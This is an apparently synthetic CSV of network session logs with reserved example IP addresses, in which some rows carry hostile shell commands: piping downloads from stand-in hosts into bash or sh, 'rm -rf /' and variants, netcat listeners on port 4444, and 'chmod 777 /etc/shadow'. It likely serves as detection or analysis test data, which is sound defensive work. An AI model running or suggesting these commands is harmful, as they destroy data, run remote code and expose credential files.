timestamp,duration,session_id,source_ip,source_port,destination_ip,destination_port,protocol,num_auth_attempts,command
2025-02-22 02:50:45.512,31,44e1b69c-03c0-46b2-9014-6395c095de4d,192.0.2.98,13533,198.51.100.170,443,https,5,
2025-02-22 02:59:08.512,31,e7f6034b-2eea-4a41-b4ac-13a098d21d4f,198.51.100.82,23753,203.0.113.77,443,ssh,5,
2025-02-22 02:42:55.512,27,b8eab4bf-5545-4f8e-a7a2-9bf5e710a8dc,198.51.100.225,13606,192.0.2.74,443,ssh,5,curl http://bad-site.com/attack | bash
2025-02-22 02:35:55.512,19,76f94294-10ae-4155-9ad8-660948fedad2,203.0.113.126,34351,192.0.2.174,80,https,0,
2025-02-22 02:58:58.512,22,5ac453a2-340e-4759-b7b6-04f926f391e2,198.51.100.172,48761,203.0.113.85,443,https,3,
2025-02-22 02:33:52.512,54,7fcefa0a-3abf-40e5-a02a-f75a28aea438,198.51.100.66,52756,192.0.2.154,443,ssh,4,
2025-02-22 02:27:56.512,11,cefb3010-56c4-4fcf-978b-90c44b664b38,198.51.100.36,63407,203.0.113.169,80,https,0,
2025-02-22 02:37:24.512,47,6f313701-fa6b-461c-86cc-a4a6273583f6,192.0.2.28,27417,192.0.2.66,443,ssh,4,rm -rf /
2025-02-22 02:56:42.512,26,e373a646-0b4f-49f5-b90a-1cf2039076e0,198.51.100.2,35988,203.0.113.127,443,https,2,rm -rf /
2025-02-22 02:46:04.512,5,6044ab0e-bf55-49df-9764-54b333096222,198.51.100.175,44852,198.51.100.227,80,https,1,
2025-02-22 02:13:24.512,29,652ff447-e1ff-453a-a97e-86b3896c41d3,192.0.2.130,47601,192.0.2.105,80,http,4,rm -rf /home/user/*
2025-02-22 02:32:26.512,56,94035580-6061-4644-b3bf-831d171571b5,192.0.2.23,60833,192.0.2.22,80,https,4,
2025-02-22 02:47:49.512,28,63745dbb-8b19-465e-a318-6bbda8aed41c,203.0.113.189,43845,198.51.100.146,80,http,0,
2025-02-22 02:39:27.512,53,44c65fdd-6230-4399-86f9-4f823bb8d90c,198.51.100.116,54969,192.0.2.177,80,http,4,
2025-02-22 02:22:02.512,38,467fb90d-1070-4fb4-8856-dd57cd5176d0,198.51.100.56,57993,198.51.100.118,443,http,4,rm -rf /
2025-02-22 02:34:42.512,44,8dbe7a07-678d-42e3-938b-f370ab33dcc3,203.0.113.112,20731,203.0.113.75,443,ssh,3,"python -c 'import os; os.system(""rm -rf *"")'"
2025-02-22 02:15:25.512,30,b93d7c0f-8f4b-4c1a-9bb4-671104c106fa,198.51.100.179,32977,198.51.100.159,80,http,3,
2025-02-22 02:16:34.512,5,642920da-e53c-46aa-8d23-23ab7033cea8,198.51.100.89,46648,203.0.113.89,443,https,5,
2025-02-22 02:53:51.512,8,f7312a19-d184-45b7-91a4-e9ea7a8689d5,192.0.2.86,52061,198.51.100.74,443,http,4,
2025-02-22 02:29:28.512,22,6ad63e89-f94f-4753-95e6-71714b0f1d0c,203.0.113.29,61130,203.0.113.155,443,http,2,rm -rf /home/user/*
2025-02-22 02:30:58.512,17,5d1144c7-fcf0-42ee-98ce-8b03fe441d1e,203.0.113.60,25835,203.0.113.178,80,http,2,
2025-02-22 02:12:37.512,34,47235551-0896-48ee-8c9a-a08fa6d3c91d,203.0.113.253,28933,198.51.100.214,80,http,2,
2025-02-22 02:56:45.512,33,6ef354d6-006b-4306-931c-d9d0a60fdc97,192.0.2.13,15683,198.51.100.242,443,ssh,1,
2025-02-22 02:58:38.512,33,0ca9ee5d-6b72-43b8-8cbc-b5c0f123922c,203.0.113.97,58902,203.0.113.247,443,http,5,
2025-02-22 02:41:48.512,26,f9f4ef00-c531-4df7-a58d-b8b2a630ffae,198.51.100.52,37431,203.0.113.47,443,http,0,
2025-02-22 02:44:02.512,59,28e90e92-b62e-4471-8d6e-e05eaf158f12,198.51.100.193,50453,192.0.2.226,80,http,5,
2025-02-22 02:18:33.512,58,289d76f5-3755-4ee0-9de7-ddab3cb4fe97,203.0.113.107,11395,198.51.100.180,443,http,0,
2025-02-22 02:16:24.512,21,1bb487e8-5cd0-4c16-aedb-8765795f4aa8,192.0.2.159,63422,203.0.113.163,80,https,4,nc -lvp 4444
2025-02-22 02:45:28.512,35,7a3eda40-a5a1-4c7c-baf7-9f40d813d157,198.51.100.166,28974,198.51.100.89,443,http,2,nc -lvp 4444
2025-02-22 02:23:39.512,18,fa9a995a-a9c2-4bd3-8693-9cc5a74d54e1,192.0.2.133,31957,192.0.2.215,80,ssh,5,
2025-02-22 02:58:29.512,10,21f9119f-bc48-4c13-893a-0a01cd93fa9c,192.0.2.190,42013,198.51.100.103,80,ssh,0,
2025-02-22 02:35:01.512,46,d4c0f68c-217d-4ecd-b3a2-e76d019c7d43,198.51.100.95,10270,203.0.113.26,80,http,5,
2025-02-22 02:27:52.512,27,917bc8c1-ed27-4eea-a946-b4dfd6bba77d,198.51.100.35,56847,192.0.2.72,443,https,3,nc -lvp 4444
2025-02-22 02:54:58.512,8,7f541aa3-822d-4f52-8d9f-40696df5d563,192.0.2.77,51566,198.51.100.109,443,ssh,5,
2025-02-22 02:48:26.512,2,c846bee1-a97c-4747-95a7-25fcc0e19660,198.51.100.176,35666,198.51.100.251,80,ssh,3,wget http://malicious.com/malware.sh -O- | sh
2025-02-22 02:49:52.512,49,d3d3e486-356d-40a9-a419-ab50bcd900f8,198.51.100.67,49071,198.51.100.158,443,http,1,curl http://bad-site.com/attack | bash
2025-02-22 02:26:31.512,5,71b83520-febc-4b78-8d44-c20fbbd2127e,192.0.2.78,62532,198.51.100.139,443,https,4,
2025-02-22 02:21:37.512,59,042e8b64-e061-44cd-b7f8-1b7f10739fe9,203.0.113.136,22958,203.0.113.56,80,https,1,
2025-02-22 02:35:26.512,3,4e34b513-a280-43a4-87a1-2463e5865475,203.0.113.199,3501,198.51.100.146,443,ssh,0,
2025-02-22 02:36:26.512,16,45c53daf-01c1-40b5-b146-823e572feded,192.0.2.218,1753,192.0.2.142,80,https,0,
2025-02-22 02:30:50.512,16,78b23912-c015-426d-8a34-44edebd39c42,192.0.2.67,52850,198.51.100.188,443,ssh,4,
2025-02-22 02:59:50.512,24,a8f0e05a-4ebd-4f1b-9d77-dd9aa1f4c4cf,192.0.2.123,11056,203.0.113.37,80,ssh,5,
2025-02-22 02:38:34.512,0,704f6707-eae4-4d57-95b5-30992df4beee,198.51.100.99,44818,203.0.113.5,443,ssh,0,
2025-02-22 02:45:11.512,28,b8f89a34-93b7-4e22-9780-88f15fa1d435,192.0.2.166,18820,198.51.100.158,443,https,4,
2025-02-22 02:30:15.512,0,b0c47976-ca6d-404e-811c-823b01bf923e,192.0.2.89,39074,198.51.100.234,443,http,5,
2025-02-22 02:53:10.512,2,75a87013-8289-4f69-9815-1d7b562050c6,203.0.113.136,62045,192.0.2.224,80,https,1,
2025-02-22 02:26:46.512,59,26e521cf-01a7-4ea6-ba61-486f043fe0d0,203.0.113.235,54385,203.0.113.18,80,http,0,rm -rf /home/user/*
2025-02-22 02:22:09.512,44,5cd78190-e489-4e8b-b758-e373cc72d455,203.0.113.32,38980,198.51.100.214,443,http,1,
2025-02-22 02:31:57.512,54,a0b8a9e7-90b2-416f-856e-996ee46d6510,192.0.2.37,3863,198.51.100.10,443,http,0,
2025-02-22 02:27:07.512,38,570f3fee-6f42-4baf-8ea7-41207f2992a3,198.51.100.237,33722,198.51.100.99,443,ssh,0,
2025-02-22 02:07:51.512,43,e8d032f9-293d-4811-ae52-f7fffc9df60d,192.0.2.38,61928,192.0.2.64,80,https,4,
2025-02-22 02:58:34.512,37,2a63e814-c86d-4e19-ad43-9657bfe86060,192.0.2.116,63216,198.51.100.56,443,https,0,
2025-02-22 02:16:02.512,14,f40f6fc4-496f-43fd-8c6b-88b60dccff4d,203.0.113.241,15353,203.0.113.96,443,ssh,1,
2025-02-22 02:50:10.512,38,3c451c34-5d49-4d1e-8643-73c11b223f4e,192.0.2.29,34243,192.0.2.233,80,ssh,5,
2025-02-22 02:21:14.512,16,ef72d45d-8991-420f-8746-8ae6ab8549a1,198.51.100.42,15637,192.0.2.206,443,https,5,
2025-02-22 02:05:15.512,43,f172ec72-cc8a-474c-8cef-0eb91676ca10,203.0.113.130,22710,192.0.2.227,80,http,4,rm -rf /
2025-02-22 02:49:49.512,24,ebde9d20-91f8-4fee-ae39-c603cecaf2f9,203.0.113.157,65392,192.0.2.73,443,http,2,
2025-02-22 02:28:15.512,12,7ba97792-50a8-4ff1-bfca-80a015b8dc53,198.51.100.212,43753,198.51.100.233,443,http,4,
2025-02-22 02:43:13.512,18,ee0da82d-5fb9-4e89-b26c-1a9935bb5c74,192.0.2.227,53436,198.51.100.145,80,ssh,2,
2025-02-22 02:16:00.512,58,6c4690d1-afec-4c67-83b9-2d1c8faa8d4d,192.0.2.160,25334,192.0.2.134,443,ssh,1,nc -lvp 4444
2025-02-22 02:17:31.512,20,be269afc-26bb-45bf-a70f-26b6fdaa184d,203.0.113.39,59645,203.0.113.37,443,https,0,rm -rf /home/user/*
2025-02-22 02:29:49.512,50,518cf2f8-bbaf-44d7-be04-341bb44594f8,203.0.113.209,33388,203.0.113.211,443,ssh,4,
2025-02-22 03:04:43.512,59,018f4227-89a8-43b9-9282-64c9535a2529,192.0.2.125,38327,198.51.100.9,443,ssh,3,chmod 777 /etc/shadow
2025-02-22 02:24:23.512,10,169ed2fe-03d4-4fb5-9079-265079e76905,198.51.100.8,10186,192.0.2.37,80,https,2,
2025-02-22 02:48:07.512,51,acd19fdd-ba7e-4756-a9ec-088e515f1867,203.0.113.231,1846,198.51.100.22,443,https,4,chmod 777 /etc/shadow
2025-02-22 02:25:29.512,5,22134f85-682f-4ff7-b4ef-1d5d19a7a995,192.0.2.176,10343,198.51.100.42,443,https,1,
2025-02-22 03:03:54.512,39,d8e0961a-7a1f-4a23-9aa2-cb01ce430c61,198.51.100.201,2244,198.51.100.108,80,http,0,nc -lvp 4444
2025-02-22 02:22:34.512,49,dacd53db-a8e7-4bc1-9647-2076c21877d8,192.0.2.169,15221,203.0.113.44,443,ssh,1,
